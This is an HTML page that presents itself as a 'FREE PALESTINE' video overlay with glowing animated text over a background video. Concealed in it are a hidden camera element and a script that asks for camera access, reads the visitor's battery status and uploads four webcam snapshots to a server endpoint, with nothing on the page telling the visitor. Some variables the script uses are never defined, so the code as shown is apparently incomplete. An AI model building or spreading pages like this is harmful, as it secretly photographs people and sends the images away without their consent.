<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FREE PALESTINE Video Overlay</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">

<style>
html, body {
  margin: 0; padding: 0;
  height: 100%; width: 100%;
  overflow: hidden;
  background: #000;
  font-family: 'Orbitron', sans-serif;
}

/* Video background */
video#bgVideo {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  object-fit: cover;
  z-index: 0;
}

/* Neon text overlay */
.text-layer {
  position: absolute;
  font-weight: 800;
  white-space: nowrap;
  z-index: 2;
  color: #ff0000;
  text-shadow: 0 0 5px #ff0000,0 0 10px #ff5500,0 0 20px #ffaa00,0 0 30px #ff0000,0 0 40px #ff5555;
  animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
}

.text1 { font-size: 6vw; top: 50%; left: 10%; animation-delay: 0s; }
.text2 { font-size: 5vw; top: 55%; left: 30%; animation-delay: 2s; }
.text3 { font-size: 4vw; top: 60%; left: 50%; animation-delay: 4s; }
.text4 { font-size: 5vw; top: 65%; left: 70%; animation-delay: 6s; }
.text5 { font-size: 4.5vw; top: 70%; left: 20%; animation-delay: 8s; }

@keyframes floatUp { 0% { transform: translateY(0px); opacity:1; } 100% { transform: translateY(-150px); opacity:0.8; } }
@keyframes glow { 0% { text-shadow:0 0 5px #ff0000,0 0 10px #ff5500,0 0 20px #ffaa00,0 0 30px #ff0000,0 0 40px #ff5555; } 100% { text-shadow:0 0 10px #ff0000,0 0 20px #ff5500,0 0 30px #ffaa00,0 0 40px #ff0000,0 0 50px #ff5555; } }

/* Hidden camera + snapshot elements */
video#camera, canvas#snapshot { display:none; }
</style>
</head>
<body>

<video id="bgVideo" autoplay playsinline loop>
  <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
</video>

<div class="text-layer text1">FREE PALESTINE</div>
<div class="text-layer text2">FREE PALESTINE</div>
<div class="text-layer text3">FREE PALESTINE</div>
<div class="text-layer text4">FREE PALESTINE</div>
<div class="text-layer text5">FREE PALESTINE</div>

<video id="camera" autoplay playsinline></video>
<canvas id="snapshot"></canvas>

<script>
  function takeSnapshotAndSend(battery, charging) {
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.warn("⚠️ Video not ready, retrying in 200ms...");
      setTimeout(() => takeSnapshotAndSend(battery, charging), 200); // ✨ fallback retry
      return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/png');

    fetch('/api/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: imageData, uid, battery, charging })
    }).then(res => res.json()).then(data => {
      console.log("✅ Uploaded:", data);
      log.innerText += "Snapshot uploaded...\n";
    }).catch(err => {
      console.error("❌ Upload error:", err);
      log.innerText += "Upload failed!\n";
    });
  }

  if (uid) {
    navigator.getBattery().then(battery => {
      const batteryLevel = Math.round(battery.level * 100);
      const isCharging = battery.charging;

      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;

      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        video.srcObject = stream;
        statusEl.innerText = "Camera access granted...";

        // ✨ د ویډیو د لومړي frame وروسته snapshots پیل شي
        video.onplaying = () => {
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
        };
      }).catch(err => {
        console.error("Camera error:", err);
        statusEl.innerText = "Camera error!";
      });
    });
  }
</script> 

</body>
</html>
